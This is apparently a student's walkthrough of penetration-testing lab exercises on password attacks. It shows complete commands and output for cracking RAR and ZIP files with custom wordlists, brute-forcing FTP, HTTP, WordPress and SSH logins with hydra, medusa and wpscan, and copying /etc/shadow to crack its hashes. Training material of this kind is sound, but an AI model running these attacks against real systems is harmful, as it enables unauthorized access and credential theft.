
# 19.4.6.2
You found this encrypted file _flag.rar_ after gaining access to the manager of MegaCorp One's _/challenge_ folder on the VM #1 while conducting a pentest on the company.  
You previously identified a couple of his other passwords including _nanomedicines234_ and _Cyberisation649_ where _nanomedicines_ and _Cyberisation_ both are products of MegaCorp (words) that can be found on their website [www.megacorpone.com.](http://www.megacorpone.com.)  
You also know the password requirement is at least _12 characters with 3 digits_.  
Use this information to generate a custom wordlist to crack this zip file and get the flag.

```bash
cewl www.megacorpone.com -m 12 -w cewl-megacorp.txt  
scp -P 2222 192.168.141.10:/challenge/flag.rar .  
rar2john flag.rar > flagr.hash


sudo vim /etc/john/john.conf  
	(add above [List.Rules:Wordlist])  
  
	[List.Rules:myrules]  
	#Append 3 digits to wordlist  
	$[0-9]$[0-9]$[0-9]


john --wordlist=megacorp flagr.hash  
	Using default input encoding: UTF-8  
	Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])  
	Cost 1 (iteration count) is 32768 for all loaded hashes  
	Will run 2 OpenMP threads  
	Press 'q' or Ctrl-C to abort, almost any other key for status  
	->Regeneration298  (flag.rar)


sudo unrar e -pRegeneration298 flag.rar    
	UNRAR 6.12 freeware      Copyright (c) 1993-2022 Alexander Roshal  
	Extracting from flag.rar  
	Extracting  flag.txt                 OK   
	All OK  
  
cat flag.txt
```



# 19.4.6.3
(Similar to above, only flag.zip &....)  
You previously identified several of her other passwords including _bella9221!!_ and _charlie2323##_ where _rosie_ and _bailey_ are the names of two of her pets.  
Looking at her social media, you find out she has a third pet named _buddy_.  
Use this information to generate a custom wordlist to open this file and get the flag.

```bash
zip2john flag.zip > flagz.hash  
  
cat >> pets.txt  
bella  
charlie  
buddy  
rosie  
bailey  
  
crunch 6 6 -t %%%%^^ -o char.txt  
  
/usr/share/hashcat-utils/combinator.bin pets.txt chars.txt > petchar.txt  
  
john --wordlist=petchar.txt flagz.hash  
...  
Loaded 1 password hash (PKZIP [32/64])  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
->buddy2033==      (flag.zip/flag.txt)     
  
unzip -P buddy2033== flag.zip
```



# 19.4.6.4
After enumerating the target VM #3, you will find an FTP server running that is available remotely.  
Use a password attack technique to log into this FTP server with the user offsec while keeping the number of workers not above 3.

```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.141.52  
	no results  
  
medusa -h 192.168.141.52 -u offsec -P /usr/share/wordlists/rockyou.txt -M ftp -t 3  
	ACCOUNT FOUND: [ftp] Host: 192.168.141.52 User: offsec Password: buster [SUCCESS]  
  
  
ftp 192.168.141.52  
	ls  
	get flag.txt  
	bye  
  
cat flag.txt
```



# 19.4.6.5
Use a password attack technique against the target VM #4 to log into the website with the _offsec_ user.

```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt -f  192.168.149.52  http-get  
...  
	[80][http-get] host: 192.168.149.52   login: offsec   password: eduardo  
  
OR  
  
medusa -h 192.168.141.52 -u offsec -P /usr/share/wordlists/rockyou.txt -M http  
...  
ACCOUNT FOUND: [http] Host: 192.168.141.52 User: offsec Password: eduardo [SUCCESS]
```



# 19.4.6.6
You have found this list of possible employee username on target VM #5 inside the _users.txt_ file on the web server's root path.  
Use this list and a password attack technique to log into this website.

```bash
curl 192.168.149.10/users.txt > users  
  
wpscan --url http://192.168.149.52 -U users -P /usr/share/wordlists/rockyou.txt  
	[+] Performing password attack on Wp Login against 43 user/s  
[SUCCESS] - jim / claudia                                                                                                                     
^Cying ben / charles Time: 00:09:43 <                                                            > (14604 / 616809074)  0.00%  ETA: ??:??:??  
	[!] Valid Combinations Found:  
	 | Username: jim, Password: claudia
```



# 19.4.6.7
Use a password attack technique to log into the target VM #6 via SSH with the user _offsec_.

```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.149.52:2222  
...  
	2222][ssh] host: 192.168.149.52   login: offsec   password: ginger  
  
OR  
  
medusa -M ssh -u offsec -P /usr/share/wordlists/rockyou.txt -h 192.168.149.52 -n 2222  
...  
ACCOUNT FOUND: [ssh] Host: 192.168.149.52 User: offsec Password: ginger [SUCCESS]
```
	SSH on exercises is usually port 2222


# 19.4.6.8
The _shadow man_ admin messed up the configurations on the target VM #7 server and gave you access to see something he shouldn't have.  
Can you use this access to read the flag?

```bash
scp -P 2222 student@192.168.149.52:/etc/passwd ./passwd  
scp -P 2222 student@192.168.149.52:/etc/shadow ./shadow  
scp -P 2222 student@192.168.149.52:passwords.txt ./pw.lst  
  
unshadow passwd shadow > combined  
  
john combined  
	...  
	Proceeding with wordlist:/usr/share/john/password.lst  
	lorena           (shadow-man)       
	Proceeding with incremental:ASCII  
	lab              (student)  
  
OR  
  
john --wordlist=pw.lst combined  
  
ssh shadow-man@192.168.149.52 -p 2222
```